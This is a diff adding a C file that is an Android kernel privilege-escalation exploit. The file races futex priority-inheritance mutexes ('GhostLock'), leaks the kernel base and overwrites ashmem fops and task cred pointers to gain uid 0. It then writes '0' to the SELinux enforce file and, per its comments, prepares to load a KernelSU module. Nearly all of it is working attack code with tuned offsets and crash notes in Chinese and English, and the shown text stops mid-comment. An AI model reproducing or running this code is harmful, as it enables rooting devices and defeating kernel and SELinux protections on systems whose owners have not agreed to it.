@@ -1,0 +1,1303 @@
+#include "common.h"
+
+uint32_t f_wait;
+uint32_t f_pi_target;
+uint32_t f_pi_chain;
+uint32_t f_owner_block;  /* v29: third PI mutex for deep chain */
+atomic_int waiter_ready;
+atomic_int block_holder_ready;  /* v29: block_holder signals readiness */
+atomic_int waiter_blocked;
+atomic_int owner_started;
+atomic_int owner_chain_done;
+atomic_int route_done;
+atomic_int requeue_done;
+atomic_int waiter_tid;
+atomic_int punch_consume_go;
+atomic_int punch_consume_stop;
+atomic_int consumer_calls;
+atomic_int consumer_success;
+atomic_int main_route_delay_usec;
+atomic_int pipe_prepare_request;
+atomic_int pipe_prepare_done;
+atomic_int owner_release_go;   /* v13: owner waits for this before unlocking */
+atomic_int pselect_ready;      /* v13: pselect thread signals readiness */
+atomic_int pselect_tid;        /* v16: pselect thread stores its tid here */
+int memfd_leak;
+
+/* ── v13: Waiter thread ─────────────────────────────────────────────
+ * Waiter locks f_pi_chain, then blocks on f_pi_target (owner holds it).
+ * Waiter STAYS BLOCKED during the pselect/consumer race.
+ * Only after the race, owner unlocks → waiter wakes and proceeds. */
+void *waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int tid = (int)syscall(SYS_gettid);
+  atomic_store(&waiter_tid, tid);
+
+  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("waiter lock chain errno=%d\n", errno);
+  }
+
+  atomic_store(&waiter_ready, 1);
+  while (!atomic_load(&owner_started)) {
+    usleep(1000);
+  }
+
+  /* v29: Give owner time to fully block on f_owner_block.
+   * Without this delay, owner->pi_blocked_on may still be NULL
+   * when waiter tries f_pi_target → chain single-level → Call 2/3 skipped. */
+  usleep(150000);  /* 150ms */
+  pr_info("DBG waiter: delay done, owner should be fully blocked on f_owner_block\n");
+  fflush(stdout);
+
+  /* Block on f_pi_target (held by owner) → waiter goes on PI tree.
+   * We stay here until owner unlocks via owner_release_go signal. */
+  atomic_store(&waiter_blocked, 1);
+  pr_info("DBG waiter: calling FUTEX_LOCK_PI on f_pi_target (owner holds it)...\n");
+  fflush(stdout);
+  long lock_ret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  int lock_errno = errno;
+  pr_info("DBG waiter: FUTEX_LOCK_PI(f_pi_target) ret=%ld errno=%d\n",
+          lock_ret, lock_errno);
+  fflush(stdout);
+
+  /* Now we own f_pi_target. Check if GhostLock race succeeded. */
+  pr_info("DBG waiter: woke from PI block, checking race result...\n");
+  fflush(stdout);
+
+  /* Check if ASHMEM_MISC_FOPS or name[8..15] were written by the race. */
+  int fd = open_ashmem_device();
+  uint64_t pre_check = 0;
+  uint64_t pre_name = 0;
+  if (fd >= 0) {
+    uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+    uintptr_t name_8_15 = data_addr(ASHMEM_MISC_FOPS) - 8;
+    configfs_read_once(fd, misc_fops, &pre_check, sizeof(pre_check));
+    configfs_read_once(fd, name_8_15, &pre_name, sizeof(pre_name));
+    pr_info("DBG waiter: post-wake pre_check=%016zx pre_name=%016zx errno=%d\n",
+            pre_check, pre_name, errno);
+    fflush(stdout);
+  }
+
+  if (pre_check != 0 && is_kernel_ptr(pre_check)) {
+    pr_info("DBG waiter: GhostLock write detected! pre_check=%016zx -> skipping pselect\n",
+            pre_check);
+    fflush(stdout);
+    if (fd >= 0) {
+      try_cfi_stage();
+      close(fd);
+    }
+  } else {
+    pr_info("DBG waiter: GhostLock race did not write (pre_check=%016zx pre_name=%016zx), "
+            "trying fallback pselect...\n", pre_check, pre_name);
+    fflush(stdout);
+    if (fd >= 0) close(fd);
+    do_pselect_fake_lock_route();
+  }
+
+  atomic_store(&route_done, 1);
+
+  pr_info("DBG waiter: route_done=1, unlocking f_pi_target and f_pi_chain...\n");
+  fflush(stdout);
+  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  pr_info("DBG waiter: f_pi_chain unlocked, waiting owner_chain_done=%d...\n",
+          atomic_load(&owner_chain_done));
+  fflush(stdout);
+  while (!atomic_load(&owner_chain_done)) {
+    usleep(1000);
+  }
+  pr_info("DBG waiter: owner_chain_done ok, exiting\n");
+  fflush(stdout);
+  return NULL;
+}
+
+/* ── v29: Block holder thread ─────────────────────────────────────
+ * Holds f_owner_block so owner blocks on it, creating a 2-level PI chain.
+ * Chain: block_holder → owner → waiter.
+ * Without this, owner->pi_blocked_on==NULL → Call 2/3 never execute. */
+void *block_holder_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  long lock_ret = futex_op(&f_owner_block, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (lock_ret != 0) {
+    pr_error("block_holder lock errno=%d\n", errno);
+  }
+  pr_info("DBG block_holder: locked f_owner_block, chain ready\n");
+  fflush(stdout);
+
+  atomic_store(&block_holder_ready, 1);
+
+  /* Wait for pselect thread to finish GhostLock race */
+  while (!atomic_load(&owner_release_go)) {
+    usleep(5000);
+  }
+
+  pr_info("DBG block_holder: owner_release_go received, unlocking f_owner_block...\n");
+  fflush(stdout);
+  futex_op(&f_owner_block, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+
+  for (;;) {
+    sleep(1);
+  }
+}
+
+/* ── v29: Owner thread (deep chain) ─────────────────────────────────
+ * v13: locks f_pi_target, waits for pselect signal, unlocks.
+ * v29: after locking f_pi_target, BLOCKS on f_owner_block (held by block_holder).
+ * This makes owner->pi_blocked_on != NULL, enabling Call 2/3 in rt_mutex chain walk. */
+void *owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  /* Wait for block_holder to lock f_owner_block first */
+  while (!atomic_load(&block_holder_ready)) {
+    usleep(1000);
+  }
+
+  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (lock_target != 0) {
+    pr_error("owner lock target errno=%d\n", errno);
+  }
+
+  while (!atomic_load(&waiter_ready)) {
+    usleep(1000);
+  }
+
+  atomic_store(&owner_started, 1);
+
+  /* v29: Block on f_owner_block instead of busy-waiting.
+   * This creates a 2-level PI chain: block_holder→owner→waiter.
+   * When waiter blocks on f_pi_target, rt_mutex_adjust_prio_chain
+   * sees owner->pi_blocked_on != NULL and walks the full chain,
+   * executing Call 2/3 which rb_erase pi_tree_entry (pi_parent=FOPS-8|RED). */
+  pr_info("DBG owner: blocking on f_owner_block (deep PI chain)...\n");
+  fflush(stdout);
+  long lock_block = futex_op(&f_owner_block, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  pr_info("DBG owner: woke from f_owner_block ret=%ld errno=%d\n",
+          lock_block, errno);
+  fflush(stdout);
+
+  /* v29: unlock both mutexes to wake the waiter */
+  futex_op(&f_owner_block, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&owner_chain_done, 1);
+
+  for (;;) {
+    sleep(1);
+  }
+}
+
+/* ── v13: Consumer thread (same as v12) ────────────────────────────
+ * v16: supports PSELECT_TARGET env var to choose which tid to target:
+ *   "waiter" (default) - sched_setattr on waiter thread
+ *   "pselect" - sched_setattr on pselect thread itself (different code path!) */
+void *consumer_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  pin_to_core(CONSUMER_CORE);
+  /* mt77: PSELECT_CONSUMER_CPU override — 大核防饿 (同 slide.c, 见
+   * 2026-09-05 R_mt76_starved 饿窗实证)。仅 opt-in, 默认 CPU1 不变。 */
+  {
+    char *cc_env = getenv("PSELECT_CONSUMER_CPU");
+    if (cc_env && *cc_env) {
+      int cc = atoi(cc_env);
+      cpu_set_t set;
+      CPU_ZERO(&set);
+      if (cc >= 0 && cc < CPU_SETSIZE) {
+        CPU_SET(cc, &set);
+        if (sched_setaffinity(0, sizeof(set), &set) == 0) {
+          pr_info("mt77: consumer pinned to CPU%d (env override)\n", cc);
+        } else {
+          pr_error("mt77: pin CPU%d failed errno=%d - keep CPU%d\n",
+                   cc, errno, CONSUMER_CORE);
+        }
+      } else {
+        pr_error("mt77: CPU%d out of range - keep CPU%d\n", cc, CONSUMER_CORE);
+      }
+      fflush(stdout);
+    }
+  }
+
+  /* v16: choose target */
+  int target_mode = 0; /* 0=waiter, 1=pselect */
+  char *target_env = getenv("PSELECT_TARGET");
+  if (target_env && strcmp(target_env, "pselect") == 0) {
+    target_mode = 1;
+  }
+
+  int seen = 0;
+
+  while (!atomic_load(&punch_consume_stop)) {
+    int seq = atomic_load(&punch_consume_go);
+    if (seq == 0 || seq == seen) {
+      __asm__ volatile("yield" ::: "memory");
+      continue;
+    }
+
+    seen = seq;
+    int tid = target_mode ? atomic_load(&pselect_tid) : atomic_load(&waiter_tid);
+    int calls_this_seq = 0;
+    while (!atomic_load(&punch_consume_stop) &&
+           atomic_load(&punch_consume_go) == seq) {
+      if (atomic_load(&punch_consume_stop) ||
+          atomic_load(&punch_consume_go) != seq) {
+        continue;
+      }
+      int delay_usec = atomic_load(&main_route_delay_usec);
+      if (delay_usec > 0) {
+        usleep((useconds_t)delay_usec);
+      }
+      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+        if (atomic_load(&punch_consume_stop) ||
+            atomic_load(&punch_consume_go) != seq) {
+          break;
+        }
+        atomic_fetch_add(&consumer_calls, 1);
+        int consumer_nice = PSELECT_CONSUMER_NICE;
+        errno = 0;
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
+        if (sched_ret == 0) {
+          atomic_fetch_add(&consumer_success, 1);
+        }
+        calls_this_seq++;
+        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+          atomic_store(&punch_consume_go, 0);
+          break;
+        }
+      }
+    }
+  }
+
+  return NULL;
+}
+
+/* ── v13: Static helper for route_delay_usec ────────────────────── */
+/* v15: delays start at 0 so consumer can race with pselect */
+static int route_delay_usec(int attempt) {
+  static const int delays[] = {
+    0, 1000, 2000, 5000, 10000, 20000, 50000, 100000,
+  };
+  int count = (int)(sizeof(delays) / sizeof(delays[0]));
+  return delays[(attempt - 1) % count];
+}
+
+/* ── v13: Pselect thread (NEW) ─────────────────────────────────────
+ * Runs pselect in a SEPARATE thread while waiter is blocked on PI tree.
+ * Consumer targets the blocked waiter during pselect → GhostLock race.
+ * After pselect returns, signals owner to release. */
+void *pselect_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int my_tid = (int)syscall(SYS_gettid);
+  atomic_store(&pselect_tid, my_tid);
+
+  /* Wait for waiter to be blocked on f_pi_target */
+  while (!atomic_load(&waiter_blocked)) {
+    usleep(1000);
+  }
+  pr_info("DBG pselect_thread: waiter is blocked, starting pselect race... "
+          "pselect_tid=%d waiter_tid=%d\n",
+          my_tid, atomic_load(&waiter_tid));
+  fflush(stdout);
+
+  atomic_store(&pselect_ready, 1);
+
+  /* Run the pselect route (same as do_pselect_fake_lock_route but in this thread) */
+  if (!page_base || !fake_lock || !fake_fops) {
+    pr_error("pselect_thread missing kernel page\n");
+    atomic_store(&owner_release_go, 1);
+    return NULL;
+  }
+
+  extern void pselect_set_shift(int);
+  int overall_success = 0;
+  /* mt15: 读 boot_id (写验证目标) */
+  char bootid_before[64] = {0};
+  int bootid_fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (bootid_fd >= 0) {
+    ssize_t bn = read(bootid_fd, bootid_before, sizeof(bootid_before) - 1);
+    close(bootid_fd);
+    if (bn > 0) bootid_before[bn] = 0;
+  }
+  pr_info("DBG bootid_before=%s\n", bootid_before);
+  fflush(stdout);
+
+  /* mt13: PSELECT_ONE_SHOT=1 → 只跑 1 次 pselect (省 slab, 测完即退)
+     mt15: PSELECT_SWEEP_SHIFTS=1 → 扫 shift 0-7, 每次回读 boot_id 验证写原语 */
+  int sweep_shifts = getenv("PSELECT_SWEEP_SHIFTS") != NULL;
+  int sweep_max = 15;
+  if (getenv("PSELECT_SWEEP_MAX")) sweep_max = atoi(getenv("PSELECT_SWEEP_MAX"));
+  int max_route_attempts =
+      sweep_shifts ? sweep_max : (getenv("PSELECT_ONE_SHOT") ? 1 : PSELECT_CFI_ROUTE_ATTEMPTS);
+  for (int route_attempt = 1; route_attempt <= max_route_attempts;
+       route_attempt++) {
+    int cur_shift = -1;
+    if (sweep_shifts) {
+      cur_shift = (route_attempt - 1) % sweep_max;
+      pselect_set_shift(cur_shift);
+      pr_info("DBG sweep shift=%d attempt=%d\n", cur_shift, route_attempt);
+      fflush(stdout);
+    }
+    if (route_attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base || !fake_lock || !fake_fops) {
+        pr_error("pselect retry page prepare failed attempt=%d\n", route_attempt);
+        break;
+      }
+    }
+
+    int pipefd[2];
+    SYSCHK(pipe(pipefd));
+    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+    if (high_read < 0) {
+      close(pipefd[0]);
+      close(pipefd[1]);
+      break;
+    }
+
+    fd_set in, out, ex;
+    prepare_pselect_fdsets(&in, &out, &ex);
+
+    /* v16: debug — show actual fd_set layout before open_selected_fds */
+    if (route_attempt == 1) {
+      int wps = (PSELECT_ROUTE_NFDS + 63) / 64;  /* words per fd_set */
+      pr_info("DBG fd_set words (wps=%d):\n", wps);
+      pr_info("  in[0..4]:  %016llx %016llx %016llx %016llx %016llx\n",
+              (unsigned long long)fdset_get_word(&in, 0),
+              (unsigned long long)fdset_get_word(&in, 1),
+              (unsigned long long)fdset_get_word(&in, 2),
+              (unsigned long long)fdset_get_word(&in, 3),
+              (unsigned long long)fdset_get_word(&in, 4));
+      pr_info("  out[0..4]: %016llx %016llx %016llx %016llx %016llx\n",
+              (unsigned long long)fdset_get_word(&out, 0),
+              (unsigned long long)fdset_get_word(&out, 1),
+              (unsigned long long)fdset_get_word(&out, 2),
+              (unsigned long long)fdset_get_word(&out, 3),
+              (unsigned long long)fdset_get_word(&out, 4));
+      pr_info("  ex[0..4]:  %016llx %016llx %016llx %016llx %016llx\n",
+              (unsigned long long)fdset_get_word(&ex, 0),
+              (unsigned long long)fdset_get_word(&ex, 1),
+              (unsigned long long)fdset_get_word(&ex, 2),
+              (unsigned long long)fdset_get_word(&ex, 3),
+              (unsigned long long)fdset_get_word(&ex, 4));
+      pr_info("  => waiter: lock(w7)=out[2]=%016llx  prio(w8)=out[3]=%016llx  deadline(w9)=out[4]=%016llx\n",
+              (unsigned long long)fdset_get_word(&out, 2),
+              (unsigned long long)fdset_get_word(&out, 3),
+              (unsigned long long)fdset_get_word(&out, 4));
+      pr_info("  page=%016zx lock=%016zx fops=%016zx target=%016zx\n",
+              page_base, fake_lock, fake_fops,
+              data_addr(ASHMEM_MISC_FOPS));
+      fflush(stdout);
+    }
+
+    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+
+    atomic_store(&consumer_calls, 0);
+    atomic_store(&consumer_success, 0);
+    atomic_store(&punch_consume_stop, 0);
+    int delay_usec = route_delay_usec(route_attempt);
+    atomic_store(&main_route_delay_usec, delay_usec);
+    atomic_store(&punch_consume_go, route_attempt);
+
+    pr_info("DBG pselect_thread: attempt=%d calling pselect(NFDS=%d) "
+            "while waiter is BLOCKED on PI tree...\n",
+            route_attempt, PSELECT_ROUTE_NFDS);
+    fflush(stdout);
+
+    struct timespec timeout = { .tv_sec = PSELECT_TIMEOUT_SEC, .tv_nsec = 0 };
+    errno = 0;
+    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
+    int saved_errno = errno;
+    atomic_store(&punch_consume_go, 0);
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    pr_info("pselect_thread returned attempt=%d ret=%d errno=%d calls=%d success=%d\n",
+            route_attempt, ret, saved_errno, calls, success);
+
+    close(high_read);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    if (calls > 0 && success > 0) {
+      overall_success = 1;
+      pr_info("DBG pselect_thread: consumer ran during pselect (calls=%d success=%d)!\n",
+              calls, success);
+      /* mt15: 回读 boot_id 验证写入 */
+      char bootid_after[64] = {0};
+      int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+      if (bfd >= 0) {
+        ssize_t bn = read(bfd, bootid_after, sizeof(bootid_after) - 1);
+        close(bfd);
+        if (bn > 0) bootid_after[bn] = 0;
+      }
+      pr_info("DBG bootid_after=%s\n", bootid_after);
+      int bootid_changed = strcmp(bootid_before, bootid_after) != 0;
+      pr_info("★ mt15 bootid_changed=%d\n", bootid_changed);
+      fflush(stdout);
+      if (bootid_changed) {
+        pr_info("★★ WRITE PRIMITIVE CONFIRMED at shift=%d!\n", cur_shift);
+        fflush(stdout);
+        atomic_store(&route_done, 1);
+        atomic_store(&owner_release_go, 1);
+        break;
+      }
+    }
+
+    /* v28: After GhostLock race, directly try_cfi_stage to verify FOPS overwrite.
+     * configfs_read checks are useless (read through real fops = shared mem = 0).
+     * Only way to know: try_cfi_stage → if configfs_write succeeds, FOPS was patched! */
+    if (calls > 0 && success > 0) {
+      pr_info("DBG v28: GhostLock triggered (ret=%d calls=%d success=%d). "
+              "Running try_cfi_stage to verify FOPS...\n",
+              ret, calls, success);
+      fflush(stdout);
+      if (try_cfi_stage()) {
+        pr_info("DBG v28: try_cfi_stage SUCCEEDED! FOPS overwritten!\n");
+        fflush(stdout);
+        atomic_store(&route_done, 1);
+        atomic_store(&owner_release_go, 1);
+        overall_success = 1;
+        break;
+      } else {
+        pr_info("DBG v28: try_cfi_stage failed (step=%d errno=%d). FOPS not overwritten.\n",
+                cfi_last_step, cfi_last_errno);
+        fflush(stdout);
+      }
+    }
+
+    if (route_attempt < PSELECT_CFI_ROUTE_ATTEMPTS) {
+      pr_info("DBG pselect_thread: misc_fops unchanged, retrying...\n");
+      fflush(stdout);
+    }
+  }
+
+  pr_info("DBG pselect_thread: done, overall_success=%d. Signaling owner to release...\n",
+          overall_success);
+  fflush(stdout);
+
+  /* Signal owner to unlock f_pi_target → waiter wakes up */
+  atomic_store(&owner_release_go, 1);
+
+  return NULL;
+}
+
+void reset_main_route_state(void) {
+  f_wait = 0;
+  f_pi_target = 0;
+  f_pi_chain = 0;
+  f_owner_block = 0;  /* v29 */
+  atomic_store(&waiter_ready, 0);
+  atomic_store(&block_holder_ready, 0);  /* v29 */
+  atomic_store(&waiter_blocked, 0);
+  atomic_store(&owner_started, 0);
+  atomic_store(&owner_chain_done, 0);
+  atomic_store(&route_done, 0);
+  atomic_store(&requeue_done, 0);
+  atomic_store(&waiter_tid, 0);
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+  atomic_store(&pipe_prepare_request, 0);
+  atomic_store(&pipe_prepare_done, 0);
+  atomic_store(&owner_release_go, 0);
+  atomic_store(&pselect_ready, 0);
+  atomic_store(&pselect_tid, 0);
+  cfi_last_step = 0;
+  cfi_last_errno = 0;
+}
+
+/* ── v13: Main route orchestrator ─────────────────────────────────
+ * Creates 4 threads: waiter, owner, pselect, consumer.
+ * Main just waits for route_done (set by waiter after checking result). */
+void run_main_route_threads(void) {
+  reset_main_route_state();
+
+  pthread_t block_holder;  /* v29: created first to hold f_owner_block */
+  pthread_t waiter;
+  pthread_t owner;
+  pthread_t pselect;
+  pthread_t consumer;
+  /* v29: block_holder must lock f_owner_block BEFORE owner tries it */
+  SYSCHK(pthread_create(&block_holder, NULL, block_holder_thread, NULL));
+  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
+  SYSCHK(pthread_create(&pselect, NULL, pselect_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
+
+  /* v13: main waits for route_done (set by waiter after checking race result).
+   * Owner releases are controlled by pselect thread via owner_release_go. */
+  while (!atomic_load(&route_done)) {
+    if (atomic_exchange(&pipe_prepare_request, 0)) {
+      pipebuf_page_base = prepare_pipe_buffer_page();
+      atomic_store(&pipe_prepare_done, 1);
+    }
+    usleep(10000);
+  }
+}
+
+int run_exploit(int argc, char **argv) {
+  (void)argc;
+  (void)argv;
+
+  disable_rseq_for_thread();
+  set_unbuffer();
+  set_limit();
+  log_startup_context();
+  init_ashmem_path();
+
+  pin_to_core(CORE);
+  if (!slide_leak_kernel_base()) {
+    pr_error("slide kaslr leak failed\n");
+    return 1;
+  }
+
+  /* mt19: PSELECT_SLIDE_TRIGGER=1 → 跑真 CVE 触发 (WAIT_REQUEUE_PI + CMP_REQUEUE_PI
+   * + 同线程 pselect overlay). FOPS 路线无 requeue, 结构上不可能触发悬垂 waiter. */
+  if (getenv("PSELECT_SLIDE_TRIGGER")) {
+    pr_info("mt19: SLIDE trigger route (real CVE path)\n");
+
+    /* mt28c: PSELECT_CRED=1 → perf 泄露自身 task_struct → cred 指针覆写
+     * (task+0x820 = init_cred dmap alias) → uid 0. */
+    if (getenv("PSELECT_CRED")) {
+      pr_info("mt28c: CRED overwrite mode\n");
+      fflush(stdout);
+      /* mt41: OBS_ONLY - just leak and print cred_cand, no write */
+      if (getenv("PSELECT_OBS_ONLY")) {
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+        if (!page_base) { pr_error("mt41: page prep failed\n"); return 1; }
+        uintptr_t t = perf_find_task();
+        pr_info("mt41: OBS task=%016zx cred_cand=%016zx\n", (size_t)t, (size_t)g_perf_cred_cand);
+        fflush(stdout);
+        sleep(1);
+        return 0;
+      }
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+      pr_info("mt19: SLIDE page prepared base=0x%016zx\n", page_base);
+      if (!page_base) {
+        pr_error("mt28m: page prep failed\n");
+        return 1;
+      }
+      /* mt33: ghostlock W2 - fork blocked child, leak its task, write its cred */
+      /* mt49: PSELECT_TASK=<hex> → 外部模式: 不 fork, 直接写给定 task (双写两阶段
+       * 各跑独立进程, 干净 futex1 树). 教训(crash#2): slide_reset_trigger_state
+       * 不清 v37_* 静态 futex 词, 同进程第二次触发 → rb_insert 在已中毒 waiter 树上
+       * rebalance, 旋转把树指针写进 task+0x770..0x788(ptracer_cred/real_cred/cred,
+       * ptracer_capable@0xffffffc008147b34 实证 0x770=ptracer_cred) → 子进程 poll
+       * 解引用 munmap 后的触发线程栈 → panic. 所以: 一进程一写, RETRY=1. */
+      int cred_pipe[2] = { -1, -1 };
+      pid_t cred_child = -1;
+      char *mt49_task_env = getenv("PSELECT_TASK");
+      uintptr_t task = 0;
+      if (mt49_task_env) {
+        task = strtoull(mt49_task_env, NULL, 16);
+        pr_info("mt49: external task=%016zx (no fork, single write this process)\n",
+                (size_t)task);
+        fflush(stdout);
+      } else if (pipe(cred_pipe) != 0) {
+        pr_error("mt33: pipe failed errno=%d\n", errno);
+        return 1;
+      }
+      if (!mt49_task_env) {
+        cred_child = fork();
+        if (cred_child < 0) { pr_error("mt33: fork failed errno=%d\n", errno); return 1; }
+      }
+      if (cred_child == 0) {
+        close(cred_pipe[0]);
+        uintptr_t my_task = perf_find_task();  /* also fills g_perf_cred_cand in child */
+        uintptr_t my_cred = g_perf_cred_cand;
+        ssize_t wr = write(cred_pipe[1], &my_task, sizeof(my_task));
+        ssize_t wr2 = write(cred_pipe[1], &my_cred, sizeof(my_cred));
+        if (wr != (ssize_t)sizeof(my_task) || !my_task) _exit(1);
+        pr_info("mt33: child pid=%d task=%016zx blocking-for-cred-write\n", getpid(), (size_t)my_task);
+        fflush(stdout);
+        /* mt47 ★检测通道升级 + root 落地★
+         * 关键: 指针换 init_cred 后 uid=0xffffff80(≠0) — 旧 uid==0 判定会漏报
+         * 又一次"检测通道死人"事故! 新判据: CapEff!=0 (bitmap 直读, 指针换即刻命中)
+         * OR 任一 id 字段==0 (零写路线命中)。
+         * 命中后: setresgid/setresuid(0,0,0) — CAP_SETUID 在手, prepare_creds 复制出
+         * 私有干净 cred, 不再共享被 STORE(b) 污染的 init_cred。
+         * root 存活期 = 本子进程存活期 → 命中后不退出, 8 分钟窗口内:
+         *   marker → setenforce 探针(纯诊断) → PSELECT_KO 存在则 finit_module 重试
+         *   (等 enforce 零写轮把全局翻成 Permissive) → 成功才 exit(42)。 */
+#ifndef SYS_finit_module
+#define SYS_finit_module 273
+#endif
+        int root_seen = 0, ksu_done = 0;
+        /* mt85: 预开 KO fd — C 落地后 child 变 kernel SID 致盲, open(ksu.ko)
+         * 会被 SELinux 拒绝 (root_alive.txt 写失败实证)。fd 在 R 落地后、
+         * 致盲前预开, gate 触发时直接 finit_module(kfd) — fd 权限不随 SID 变。 */
+        int mt85_kfd = -1;
+        {
+          char *ko_pre = getenv("PSELECT_KO");
+          if (ko_pre && *ko_pre) {
+            mt85_kfd = open(ko_pre, O_RDONLY);
+            pr_info("mt85: pre-open KO fd=%d errno=%d\n", mt85_kfd, errno);
+            fflush(stdout);
+          }
+        }
+        /* mt73: sticky CapEff-full flag survives status-file blinding after C
+         * swaps cred to init_cred; SELinux kernel-SID blocks file I/O, so the
+         * old live CapEff read is lost exactly when we need it most. */
+        int mt73_capeff_seen = 0;
+        int mt73_c_signal_sent = 0;
+        /* mt84: 轮询窗口环境可调 — FWRQ 分钟级延迟把 C 落地拖到 8min 之外
+         * (2026-09-07 实证: euid=0 已落地但 gate 已停), 默认 6000=20min */
+        int mt84_polls = 6000;
+        {
+          char *pe = getenv("PSELECT_CHILD_POLLS");
+          if (pe && *pe) mt84_polls = atoi(pe);
+        }
+        for (int poll_i = 0; poll_i < mt84_polls; poll_i++) {  /* mt84: 20min 窗口 */
+          uid_t ruid, euid, suid;
+          gid_t rgid, egid, sgid;
+          getresuid(&ruid, &euid, &suid);
+          getresgid(&rgid, &egid, &sgid);
+          unsigned long long capeff = 0;
+          {
+            FILE *st = fopen("/proc/self/status", "r");
+            char ln[160];
+            if (st) {
+              while (fgets(ln, sizeof(ln), st)) {
+                if (strncmp(ln, "CapEff:", 7) == 0) {
+                  capeff = strtoull(ln + 7, NULL, 16);
+                  break;
+                }
+              }
+              fclose(st);
+            }
+          }
+          if (capeff >= 0x000001ffffffffffULL)
+            mt73_capeff_seen = 1;
+          int gate_hit;
+          if (getenv("PSELECT_PTR_STRICT")) {
+            /* mt48 满帽 AND-gate: CapEff==0x1ffffffffff(init_cred 满帽, 只可能来自
+             * real_cred 已换 — status 读的是 __task_cred=real_cred) && euid==0
+             * (只可能来自 cred 已换 — getresuid 读 current_cred)。
+             * 半程态结构性不触发 → commit_creds 入口
+             *   cmp x8([x20+0x780]cred), x19([x20+0x778]real_cred); b.ne→brk#0x800
+             * (BUG_ON(task->cred != task->real_cred) @0xffffffc008185530)
+             * 永不引爆 — 这就是 mt32-36 + mt47PTR 7/7 全灭的机制。
+             * 旧 OR-gate 的 euid==0 在"只换 cred"半程即真(euid 是 init_cred 完好字段)
+             * → setresgid → commit_creds → 指针不等 → BUG → panic 重启。 */
+            /* mt73: after C lands, /proc/self/status may be denied by SELinux
+             * (SID becomes kernel).  Use the pre-blinding sticky flag instead
+             * of the live capeff read. */
+            gate_hit = mt73_capeff_seen && (euid == 0);
+          } else {
+            gate_hit = (ruid == 0 || euid == 0 || suid == 0 ||
+                        rgid == 0 || egid == 0 || sgid == 0 || capeff != 0);
+          }
+          if (gate_hit && !root_seen) {
+            root_seen = 1;
+            pr_success("mt47: ROOT-SEEN ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d CapEff=%016llx poll=%d\n",
+                       ruid, euid, suid, rgid, egid, sgid, capeff, poll_i);
+            fflush(stdout);
+            /* mt73: external hostname beacon — sethostname needs CAP_SYS_ADMIN
+             * from init_cred and does not depend on file/status I/O. */
+            if (sethostname("glroot", 6) == 0)
+              pr_info("mt73: sethostname(glroot) signal sent\n");
+            else
+              pr_info("mt73: sethostname failed errno=%d\n", errno);
+            /* mt48: fflush 只到页缓存, panic 重启即丢 — 今天日志缺 ROOT-SEEN 的
+             * 合理解释。fsync 落盘, 崩了也留证。 */
+            fsync(fileno(stdout));
+            setresgid(0, 0, 0);
+            setresuid(0, 0, 0);
+            getresuid(&ruid, &euid, &suid);
+            getresgid(&rgid, &egid, &sgid);
+            pr_info("mt47: after setres uid=%d euid=%d gid=%d egid=%d\n",
+                    ruid, euid, rgid, egid);
+            int mfd = open("/data/local/tmp/root_alive.txt",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (mfd >= 0) {
+              dprintf(mfd, "pid=%d uid=%d euid=%d CapEff=%016llx\n",
+                      getpid(), ruid, euid, capeff);
+              close(mfd);
+            }
+            /* 诊断探针: kernel SID 的 setenforce 权限 (avc 判 SID, 与 caps 无关,
+             * 失败属预期 — enforce 零写轮才是正路) */
+            int efd2 = open("/sys/fs/selinux/enforce", O_WRONLY);
+            if (efd2 >= 0) {
+              ssize_t w2 = write(efd2, "0", 1);
+              pr_info("mt47: setenforce probe wr=%zd errno=%d\n", w2, errno);
+              close(efd2);
+            }
+            /* ASK7 (2026-10-03): 真 uid=0 处 -- 以 root 启动官方 userspace 装载器 ksud.
+             * ksu_go.sh: SELinux 策略第23字节 |0xC0 + load_policy + ksud late-load
+             *           --kmi android12-5.10 + /proc/modules 验证。
+             * finit_module 被 prep 的 fd churn(EBADF)/SELinux 堵死, 这里并行加一条;
+             * 必须后台(system 里带 &), gate 还要继续轮询/上报。 */
